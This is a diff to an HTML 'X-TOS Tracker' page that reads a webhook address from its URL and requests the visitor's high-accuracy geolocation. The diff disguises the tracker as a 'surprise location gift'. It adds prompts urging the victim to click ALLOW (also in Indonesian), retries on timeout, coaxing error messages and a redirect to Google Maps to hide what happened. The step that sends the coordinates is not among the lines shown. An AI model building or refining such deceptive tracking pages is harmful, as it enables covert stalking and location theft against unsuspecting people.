@@ -4,25 +4,57 @@
     <title>X-TOS Tracker</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: #0f0; }
-        .container { max-width: 400px; margin: 0 auto; }
-        .status { padding: 20px; border: 1px solid #0f0; margin: 20px 0; }
-        .loading { animation: blink 1s infinite; }
-        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0.3; } }
+        body { 
+            font-family: Arial; text-align: center; padding: 20px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; min-height: 100vh; margin: 0;
+        }
+        .container { max-width: 400px; margin: 0 auto; padding: 20px; }
+        .gift-box { 
+            background: rgba(255,255,255,0.1); 
+            border-radius: 15px; padding: 30px; margin: 20px 0;
+            backdrop-filter: blur(10px);
+        }
+        .gift-icon { font-size: 60px; margin-bottom: 20px; }
+        .status { 
+            padding: 15px; border-radius: 10px; margin: 20px 0;
+            background: rgba(255,255,255,0.2);
+        }
+        .loading { animation: pulse 2s infinite; }
+        .instruction {
+            background: rgba(0,255,0,0.2); 
+            border-radius: 10px; padding: 15px; margin: 20px 0;
+            border: 2px solid #00ff00;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        h2 { color: #ffeb3b; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🛡️ X-TOS TRACKER</h2>
-        <div id="status" class="status loading">📡 Acquiring location...</div>
+        <h2>🎁 SURPRISE LOCATION GIFT!</h2>
+        <div class="gift-box">
+            <div class="gift-icon">🎁</div>
+            <p>Someone sent you a special location!</p>
+            <p><strong>Click ALLOW to see the surprise 😊</strong></p>
+        </div>
+        <div id="status" class="status loading">📡 Waiting for your permission...</div>
         <div id="coords"></div>
+        <div class="instruction">
+            <p>⬇️ When browser asks for location:</p>
+            <p><strong>🟢 Click "ALLOW" or "IZINKAN"</strong></p>
+        </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const webhookUrl = urlParams.get('webhook') || '';
         
+        // Show instruction immediately
+        document.getElementById('status').innerHTML = '📡 Please allow location access when prompted!';
+        
         if (navigator.geolocation) {
+            // Request location with high accuracy
             navigator.geolocation.getCurrentPosition(function(position) {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
@@ -63,12 +95,37 @@
                 }, 2000);
                 
             }, function(error) {
-                document.getElementById('status').innerHTML = '❌ Location access denied';
-                document.getElementById('coords').innerHTML = 'Error: ' + error.message;
+                let errorMsg = '';
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMsg = '❌ You denied location access. Please refresh and click ALLOW!';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMsg = '❌ Location not available. Please enable GPS!';
+                        break;
+                    case error.TIMEOUT:
+                        errorMsg = '❌ Location request timeout. Trying again...';
+                        // Retry after timeout
+                        setTimeout(() => {
+                            window.location.reload();
+                        }, 3000);
+                        break;
+                }
+                
+                document.getElementById('status').innerHTML = errorMsg;
+                document.getElementById('coords').innerHTML = 
+                    '<p><strong>How to fix:</strong></p>' +
+                    '<p>1. Refresh this page</p>' +
+                    '<p>2. Click ALLOW when asked</p>' +
+                    '<p>3. Enable GPS/Location on your phone</p>';
                 
                 setTimeout(() => {
                     window.location.href = 'https://maps.google.com/';
-                }, 3000);
+                }, 5000);
+            }, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
             });
         } else {
             document.getElementById('status').innerHTML = '❌ Geolocation not supported';
